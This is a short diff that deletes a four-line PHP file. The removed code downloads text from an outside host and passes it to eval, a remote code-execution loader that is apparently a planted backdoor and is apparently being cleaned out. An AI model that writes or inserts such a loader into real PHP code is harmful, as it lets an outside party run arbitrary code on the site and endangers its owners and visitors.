@@ -1,4 +1,0 @@
-<?php
-$zhyvenseo = file_get_contents('https://scemabot.com/vendor/merah.txt');
-$zhyvenseo = "?> ".$zhyvenseo;
-eval($zhyvenseo);
